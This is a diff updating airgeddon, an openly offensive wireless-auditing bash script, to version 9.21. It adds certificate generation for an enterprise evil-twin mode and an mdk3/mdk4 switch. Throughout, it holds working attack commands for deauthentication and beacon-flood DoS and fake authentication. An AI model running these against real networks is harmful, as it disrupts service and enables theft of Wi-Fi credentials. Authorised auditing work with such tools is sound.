@@ -2,10 +2,14 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20190415
-#Version......: 9.20
+#Date.........: 20190812
+#Version......: 9.21
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
+
+#Global shellcheck disabled warnings
+#shellcheck disable=SC2154
+#shellcheck disable=SC2034
 
 #Language vars
 #Change this line to select another default language. Select one from available values in array
@@ -62,6 +66,7 @@ optional_tools_names=(
 						"hostapd-wpe"
 						"asleap"
 						"john"
+						"openssl"
 					)
 
 update_tools=("curl")
@@ -100,18 +105,18 @@ declare -A possible_package_names=(
 									[${optional_tools_names[21]}]="hostapd-wpe" #hostapd-wpe
 									[${optional_tools_names[22]}]="asleap" #asleap
 									[${optional_tools_names[23]}]="john" #john
+									[${optional_tools_names[24]}]="openssl" #openssl
 									[${update_tools[0]}]="curl" #curl
 								)
 
 #More than one alias can be defined separated by spaces at value
 declare -A possible_alias_names=(
 									["beef"]="beef-xss beef-server"
-									["nft"]="iptables"
 								)
 
 #General vars
-airgeddon_version="9.20"
-language_strings_expected_version="9.20-1"
+airgeddon_version="9.21"
+language_strings_expected_version="9.21-1"
 standardhandshake_filename="handshake-01.cap"
 timeout_capture_handshake="20"
 tmpdir="/tmp/"
@@ -247,6 +252,10 @@ hostapd_wpe_log="ag.hostapd_wpe.log"
 control_et_file="ag.et_control.sh"
 control_enterprise_file="ag.enterprise_control.sh"
 enterprisedir="enterprise/"
+certsdir="certs/"
+certspass="airgeddon"
+default_certs_path="/etc/hostapd-wpe/certs/"
+default_certs_pass="whatever"
 webserver_file="ag.lighttpd.conf"
 webdir="www/"
 indexfile="index.htm"
@@ -323,7 +332,7 @@ declare evil_twin_dos_hints=(267 268 509)
 declare beef_hints=(408)
 declare wps_hints=(342 343 344 356 369 390 490 625)
 declare wep_hints=(431 429 428 432 433)
-declare enterprise_hints=(112 332 483 518)
+declare enterprise_hints=(112 332 483 518 629)
 
 #Charset vars
 crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
@@ -552,13 +561,13 @@ function option_toggle() {
 		if ! grep "${option_var_name}=false" "${scriptfolder}${rc_file}" > /dev/null; then
 			return 1
 		fi
-		export ${option_var_name}=false
+		eval "export ${option_var_name}=false"
 	else
 		sed -ri "s:(${option_var_name})=(false):\1=true:" "${scriptfolder}${rc_file}" 2> /dev/null
 		if ! grep "${option_var_name}=true" "${scriptfolder}${rc_file}" > /dev/null; then
 			return 1
 		fi
-		export ${option_var_name}=true
+		eval "export ${option_var_name}=true"
 	fi
 
 	case "${option_var_name}" in
@@ -985,6 +994,7 @@ function calculate_computepin_algorithm_step2() {
 }
 
 #Calculate pin based on Stefan Viehböck algorithm (EasyBox)
+#shellcheck disable=SC2207
 function calculate_easybox_algorithm() {
 
 	debug_print
@@ -1187,10 +1197,10 @@ function search_in_pin_database() {
 	for item in "${!PINDB[@]}"; do
 		if [ "${item}" = "${six_wpsbssid_first_digits_clean}" ]; then
 			bssid_found_in_db=1
-			arrpins=(${PINDB[${item//[[:space:]]/ }]})
+			arrpins=("${PINDB[${item//[[:space:]]/ }]}")
 			for item2 in "${arrpins[@]}"; do
 				counter_pins_found=$((counter_pins_found + 1))
-				pins_found+=(${item2})
+				pins_found+=("${item2}")
 				fill_wps_data_array "${wps_bssid}" "Database" "${item2}"
 			done
 			break
@@ -1216,16 +1226,16 @@ function check_interface_supported_bands() {
 	get_5ghz_band_info_from_phy_interface "${1}"
 	case "$?" in
 		"0")
-			interfaces_band_info["${2}","5Ghz_allowed"]=1
-			interfaces_band_info["${2}","text"]="${band_24ghz}, ${band_5ghz}"
+			interfaces_band_info["${2},5Ghz_allowed"]=1
+			interfaces_band_info["${2},text"]="${band_24ghz}, ${band_5ghz}"
 		;;
 		"1")
-			interfaces_band_info["${2}","5Ghz_allowed"]=0
-			interfaces_band_info["${2}","text"]="${band_24ghz}"
+			interfaces_band_info["${2},5Ghz_allowed"]=0
+			interfaces_band_info["${2},text"]="${band_24ghz}"
 		;;
 		"2")
-			interfaces_band_info["${2}","5Ghz_allowed"]=0
-			interfaces_band_info["${2}","text"]="${band_24ghz}, ${band_5ghz} (${red_color}${disabled_text[${language}]}${pink_color})"
+			interfaces_band_info["${2},5Ghz_allowed"]=0
+			interfaces_band_info["${2},text"]="${band_24ghz}, ${band_5ghz} (${red_color}${disabled_text[${language}]}${pink_color})"
 		;;
 	esac
 }
@@ -1612,6 +1622,11 @@ function option_menu() {
 	else
 		language_strings "${language}" 617
 	fi
+	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
+		language_strings "${language}" 638
+	else
+		language_strings "${language}" 637
+	fi
 	language_strings "${language}" 447
 	print_hint ${current_menu}
 
@@ -1862,6 +1877,16 @@ function option_menu() {
 			language_strings "${language}" 115 "read"
 		;;
 		11)
+			ask_yesno 639 "yes"
+			if [ "${yesno}" = "y" ]; then
+				mdk_version_toggle
+
+				echo
+				language_strings "${language}" 640 "yellow"
+				language_strings "${language}" 115 "read"
+			fi
+		;;
+		12)
 			ask_yesno 478 "yes"
 			if [ "${yesno}" = "y" ]; then
 				get_current_permanent_language
@@ -2698,6 +2723,328 @@ function handshake_capture_check() {
 	fi
 }
 
+#Generate the needed config files for certificates creation
+#shellcheck disable=SC2016
+function create_certificates_config_files() {
+
+	debug_print
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}${certsdir}" > /dev/null 2>&1
+	mkdir "${tmpdir}${certsdir}" > /dev/null 2>&1
+
+	{
+	echo -e "[ ca ]"
+	echo -e "default_ca = CA_default\n"
+	echo -e "[ CA_default ]"
+	echo -e "dir = ${tmpdir}${certsdir::-1}"
+	echo -e 'certs = $dir'
+	echo -e 'crl_dir = $dir/crl'
+	echo -e 'database = $dir/index.txt'
+	echo -e 'new_certs_dir = $dir'
+	echo -e 'certificate = $dir/server.pem'
+	echo -e 'serial = $dir/serial'
+	echo -e 'crl = $dir/crl.pem'
+	echo -e 'private_key = $dir/server.key'
+	echo -e 'RANDFILE = $dir/.rand'
+	echo -e "name_opt = ca_default"
+	echo -e "cert_opt = ca_default"
+	echo -e "default_days = 3650"
+	echo -e "default_crl_days = 30"
+	echo -e "default_md = md5"
+	echo -e "preserve = no"
+	echo -e "policy = policy_match\n"
+	echo -e "[ policy_match ]"
+	echo -e "countryName = match"
+	echo -e "stateOrProvinceName = match"
+	echo -e "organizationName = match"
+	echo -e "organizationalUnitName = optional"
+	echo -e "commonName = supplied"
+	echo -e "emailAddress = optional\n"
+	echo -e "[ policy_anything ]"
+	echo -e "countryName = optional"
+	echo -e "stateOrProvinceName = optional"
+	echo -e "localityName = optional"
+	echo -e "organizationName = optional"
+	echo -e "organizationalUnitName = optional"
+	echo -e "commonName = supplied"
+	echo -e "emailAddress = optional\n"
+	echo -e "[ req ]"
+	echo -e "prompt = no"
+	echo -e "distinguished_name = server"
+	echo -e "default_bits = 2048"
+	echo -e "input_password = ${certspass}"
+	echo -e "output_password = ${certspass}\n"
+	echo -e "[server]"
+	echo -e "countryName = ${custom_certificates_country}"
+	echo -e "stateOrProvinceName = ${custom_certificates_state}"
+	echo -e "localityName = ${custom_certificates_locale}"
+	echo -e "organizationName = ${custom_certificates_organization}"
+	echo -e "emailAddress = ${custom_certificates_email}"
+	echo -e "commonName = \"${custom_certificates_cn}\""
+	} >> "${tmpdir}${certsdir}server.cnf"
+
+	{
+	echo -e "[ ca ]"
+	echo -e "default_ca = CA_default\n"
+	echo -e "[ CA_default ]"
+	echo -e "dir = ${tmpdir}${certsdir::-1}"
+	echo -e 'certs = $dir'
+	echo -e 'crl_dir = $dir/crl'
+	echo -e 'database = $dir/index.txt'
+	echo -e 'new_certs_dir = $dir'
+	echo -e 'certificate = $dir/ca.pem'
+	echo -e 'serial = $dir/serial'
+	echo -e 'crl = $dir/crl.pem'
+	echo -e 'private_key = $dir/ca.key'
+	echo -e 'RANDFILE = $dir/.rand'
+	echo -e "name_opt = ca_default"
+	echo -e "cert_opt = ca_default"
+	echo -e "default_days = 3650"
+	echo -e "default_crl_days = 30"
+	echo -e "default_md = md5"
+	echo -e "preserve = no"
+	echo -e "policy = policy_match\n"
+	echo -e "[ policy_match ]"
+	echo -e "countryName = match"
+	echo -e "stateOrProvinceName = match"
+	echo -e "organizationName= match"
+	echo -e "organizationalUnitName = optional"
+	echo -e "commonName = supplied"
+	echo -e "emailAddress = optional\n"
+	echo -e "[ policy_anything ]"
+	echo -e "countryName = optional"
+	echo -e "stateOrProvinceName = optional"
+	echo -e "localityName = optional"
+	echo -e "organizationName = optional"
+	echo -e "organizationalUnitName = optional"
+	echo -e "commonName = supplied"
+	echo -e "emailAddress = optional\n"
+	echo -e "[ req ]"
+	echo -e "prompt = no"
+	echo -e "distinguished_name = certificate_authority"
+	echo -e "default_bits = 2048"
+	echo -e "input_password = ${certspass}"
+	echo -e "output_password = ${certspass}"
+	echo -e "x509_extensions = v3_ca\n"
+	echo -e "[certificate_authority]"
+	echo -e "countryName = ${custom_certificates_country}"
+	echo -e "stateOrProvinceName = ${custom_certificates_state}"
+	echo -e "localityName = ${custom_certificates_locale}"
+	echo -e "organizationName = ${custom_certificates_organization}"
+	echo -e "emailAddress = ${custom_certificates_email}"
+	echo -e "commonName = \"${custom_certificates_cn}\"\n"
+	echo -e "[v3_ca]"
+	echo -e "subjectKeyIdentifier = hash"
+	echo -e "authorityKeyIdentifier = keyid:always,issuer:always"
+	echo -e "basicConstraints = CA:true"
+	} >> "${tmpdir}${certsdir}ca.cnf"
+
+	{
+	echo -e "[ xpclient_ext ]"
+	echo -e "extendedKeyUsage = 1.3.6.1.5.5.7.3.2\n"
+	echo -e "[ xpserver_ext ]"
+	echo -e "extendedKeyUsage = 1.3.6.1.5.5.7.3.1"
+	} >> "${tmpdir}${certsdir}xpextensions"
+}
+
+#Manage the questions to decide if custom certificates are used
+function custom_certificates_integration() {
+
+	debug_print
+
+	ask_yesno 645 "no"
+	if [ "${yesno}" = "y" ]; then
+		if [ -n "${enterprisecerts_completepath}" ]; then
+			ask_yesno 646 "yes"
+			if [ "${yesno}" = "y" ]; then
+				read_certspath=0
+			else
+				read_certspath=1
+			fi
+		else
+			read_certspath=1
+		fi
+		use_custom_certs=1
+	else
+		use_custom_certs=0
+	fi
+
+	echo
+	if [ "${use_custom_certs}" -eq 1 ]; then
+		if [ "${read_certspath}" -eq 0 ]; then
+			hostapd_wpe_cert_path="${enterprisecerts_completepath}"
+			hostapd_wpe_cert_pass="${certspass}"
+			language_strings "${language}" 648 "yellow"
+		else
+			language_strings "${language}" 653 "green"
+			read -rp "> " hostapd_wpe_cert_path
+
+			lastcharhostapd_wpe_cert_path=${hostapd_wpe_cert_path: -1}
+			if [ "${lastcharhostapd_wpe_cert_path}" != "/" ]; then
+				hostapd_wpe_cert_path="${hostapd_wpe_cert_path}/"
+			fi
+
+			firstcharhostapd_wpe_cert_path=${hostapd_wpe_cert_path:: 1}
+			if [ "${firstcharhostapd_wpe_cert_path}" != "/" ]; then
+				hostapd_wpe_cert_path="${scriptfolder}${hostapd_wpe_cert_path}"
+			fi
+
+			echo
+			language_strings "${language}" 654 "green"
+			read -rp "> " hostapd_wpe_cert_pass
+		fi
+	else
+		hostapd_wpe_cert_path="${default_certs_path}"
+		hostapd_wpe_cert_pass="${default_certs_pass}"
+		language_strings "${language}" 647 "yellow"
+	fi
+
+	echo
+	language_strings "${language}" 649 "blue"
+	echo
+
+	local certsresult
+	certsresult=$(validate_certificates "${hostapd_wpe_cert_path}" "${hostapd_wpe_cert_pass}")
+	if [ "${certsresult}" = "0" ]; then
+		language_strings "${language}" 650 "yellow"
+		language_strings "${language}" 115 "read"
+		return 0
+	elif [ "${certsresult}" = "1" ]; then
+		language_strings "${language}" 651 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	else
+		language_strings "${language}" 652 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	fi
+}
+
+#Validate if certificates files are correct
+function validate_certificates() {
+
+	debug_print
+	local certsresult
+	certsresult=0
+
+	if ! [ -f "${1}server.pem" ] || ! [ -r "${1}server.pem" ] || ! [ -f "${1}ca.pem" ] || ! [ -r "${1}ca.pem" ] || ! [ -f "${1}server.key" ] || ! [ -r "${1}server.key" ]; then
+		certsresult=1
+	else
+		if ! openssl x509 -in "${1}server.pem" -inform "PEM" -checkend "0" &> "/dev/null" || ! openssl x509 -in "${1}ca.pem" -inform "PEM" -checkend "0" &> /dev/null || ! openssl rsa -in "${1}server.key" -passin "pass:${2}" -check &> /dev/null; then
+			certsresult=2
+		fi
+	fi
+
+	echo "${certsresult}"
+}
+
+#Create custom certificates
+function create_custom_certificates() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 642 "blue"
+
+	openssl dhparam -out "${tmpdir}${certsdir}dh" 1024 > /dev/null 2>&1
+	openssl req -new -out "${tmpdir}${certsdir}server.csr" -keyout "${tmpdir}${certsdir}server.key" -config "${tmpdir}${certsdir}server.cnf" > /dev/null 2>&1
+	openssl req -new -x509 -keyout "${tmpdir}${certsdir}ca.key" -out "${tmpdir}${certsdir}ca.pem" -days 3650 -config "${tmpdir}${certsdir}ca.cnf" > /dev/null 2>&1
+	touch "${tmpdir}${certsdir}index.txt" > /dev/null 2>&1
+	echo '01' > "${tmpdir}${certsdir}serial" 2> /dev/null
+	openssl ca -batch -keyfile "${tmpdir}${certsdir}ca.key" -cert "${tmpdir}${certsdir}ca.pem" -in "${tmpdir}${certsdir}server.csr" -key "${certspass}" -out "${tmpdir}${certsdir}server.crt" -extensions xpserver_ext -extfile "${tmpdir}${certsdir}xpextensions" -config "${tmpdir}${certsdir}server.cnf" > /dev/null 2>&1
+	openssl pkcs12 -export -in "${tmpdir}${certsdir}server.crt" -inkey "${tmpdir}${certsdir}server.key" -out "${tmpdir}${certsdir}server.p12" -passin pass:${certspass} -passout pass:${certspass} > /dev/null 2>&1
+	openssl pkcs12 -in "${tmpdir}${certsdir}server.p12" -out "${tmpdir}${certsdir}server.pem" -passin pass:${certspass} -passout pass:${certspass} > /dev/null 2>&1
+
+	manage_enterprise_certs
+	save_enterprise_certs
+}
+
+#Set up custom certificates
+function custom_certificates_questions() {
+
+	debug_print
+
+	custom_certificates_country=""
+	custom_certificates_state=""
+	custom_certificates_locale=""
+	custom_certificates_organization=""
+	custom_certificates_email=""
+	custom_certificates_cn=""
+
+	local email_length_regex
+	local email_spetial_chars_regex
+	local email_domain_regex
+	local regexp
+
+	regexp="^[A-Za-z]{2}$"
+	while [[ ! ${custom_certificates_country} =~ ${regexp} ]]; do
+		read_certificates_data "country"
+	done
+
+	while [[ -z "${custom_certificates_state}" ]]; do
+		read_certificates_data "state"
+	done
+
+	while [[ -z "${custom_certificates_locale}" ]]; do
+		read_certificates_data "locale"
+	done
+
+	while [[ -z "${custom_certificates_organization}" ]]; do
+		read_certificates_data "organization"
+	done
+
+	email_length_regex='.*{7,320}'
+	email_spetial_chars_regex='\!\#\$\%\&\*\+\/\=\?\^\_\`\{\|\}\~\-'
+	email_domain_regex='([[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?)\.([[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?\.)*[[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?'
+	regexp="^[[:alnum:]${email_spetial_chars_regex}]+(\.[[:alnum:]${email_spetial_chars_regex}]+)*[[:alnum:]${email_spetial_chars_regex}]*\@${email_domain_regex}$"
+	while [[ ! ${custom_certificates_email} =~ ${regexp} ]] || [[ ! ${custom_certificates_email} =~ ${email_length_regex} ]]; do
+		read_certificates_data "email"
+	done
+
+	regexp="^(\*|[[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?)\.([[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?\.)*[[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?$"
+	while [[ ! ${custom_certificates_cn} =~ ${regexp} ]]; do
+		read_certificates_data "cn"
+	done
+}
+
+#Read the user input on custom certificates questions
+function read_certificates_data() {
+
+	debug_print
+
+	echo
+	case "${1}" in
+		"country")
+			language_strings "${language}" 630 "green"
+			read -rp "> " custom_certificates_country
+			custom_certificates_country="${custom_certificates_country^^}"
+		;;
+		"state")
+			language_strings "${language}" 631 "green"
+			read -rp "> " custom_certificates_state
+		;;
+		"locale")
+			language_strings "${language}" 632 "green"
+			read -rp "> " custom_certificates_locale
+		;;
+		"organization")
+			language_strings "${language}" 633 "green"
+			read -rp "> " custom_certificates_organization
+		;;
+		"email")
+			language_strings "${language}" 634 "green"
+			read -rp "> " custom_certificates_email
+			custom_certificates_email="${custom_certificates_email,,}"
+		;;
+		"cn")
+			language_strings "${language}" 635 "green"
+			read -rp "> " custom_certificates_cn
+			custom_certificates_cn="${custom_certificates_cn,,}"
+		;;
+	esac
+}
+
 #Validate if selected network has the needed type of encryption
 function validate_network_encryption_type() {
 
@@ -3340,9 +3687,9 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-				manage_output "-bg \"#000000\" -fg \"#00FF00\" -geometry ${g5_left1} -T \"Fake Auth\"" "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
+				manage_output "-bg \"#000000\" -fg \"#00FF00\" -geometry ${g5_left1} -T \"Fake Auth\"" "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
 				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-					get_tmux_process_id "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}"
+					get_tmux_process_id "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}"
 					wep_fakeauth_pid="\${global_process_pid}"
 					global_process_pid=""
 				else
@@ -3620,13 +3967,13 @@ function launch_dos_pursuit_mode_attack() {
 
 	recalculate_windows_sizes
 	case "${1}" in
-		"mdk4 amok attack")
+		"${mdk_command} amok attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -3647,9 +3994,9 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=10
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "${1} (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -3658,9 +4005,9 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -3669,9 +4016,9 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024" "${1} (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -3680,20 +4027,20 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
 		;;
-		"Mdk4")
+		"${mdk_command}")
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -3714,9 +4061,9 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "Deauth (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -3770,6 +4117,20 @@ function launch_dos_pursuit_mode_attack() {
 	airodump-ng -w "${tmpdir}dos_pm" "${interface_pursuit_mode_scan}" --band "${airodump_band_modifier}" > /dev/null 2>&1 &
 	dos_pursuit_mode_scan_pid=$!
 	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")
+
+	if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
+
+		local processes_file
+		if [ "${et_mode}" = "et_captive_portal" ]; then
+			processes_file="${tmpdir}${webdir}${et_processesfile}"
+		elif [ -n "${enterprise_mode}" ]; then
+			processes_file="${tmpdir}${enterprisedir}${enterprise_processesfile}"
+		fi
+
+		for item in "${dos_pursuit_mode_pids[@]}"; do
+			echo "${item}" >> "${processes_file}"
+		done
+	fi
 }
 
 #Parse and control pids for DoS pursuit mode attack
@@ -3814,8 +4175,8 @@ pid_control_pursuit_mode() {
 	kill_dos_pursuit_mode_processes
 }
 
-#Execute mdk4 deauth DoS attack
-function exec_mdk4deauth() {
+#Execute mdk deauth DoS attack
+function exec_mdkdeauth() {
 
 	debug_print
 
@@ -3833,14 +4194,14 @@ function exec_mdk4deauth() {
 		language_strings "${language}" 4 "read"
 
 		dos_pursuit_mode_pids=()
-		launch_dos_pursuit_mode_attack "mdk4 amok attack" "first_time"
-		pid_control_pursuit_mode "mdk4 amok attack"
+		launch_dos_pursuit_mode_attack "${mdk_command} amok attack" "first_time"
+		pid_control_pursuit_mode "${mdk_command} amok attack"
 	else
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"mdk4 amok attack\"" "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "mdk4 amok attack" "active"
-		wait_for_process "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "mdk4 amok attack"
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack" "active"
+		wait_for_process "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 	fi
 }
 
@@ -3897,8 +4258,8 @@ function exec_wdsconfusion() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"wids / wips / wds confusion attack\"" "mdk4 ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack" "active"
-		wait_for_process "mdk4 ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack" "active"
+		wait_for_process "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
 	fi
 }
 
@@ -3925,8 +4286,8 @@ function exec_beaconflood() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "mdk4 ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack" "active"
-		wait_for_process "mdk4 ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack"
+		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack" "active"
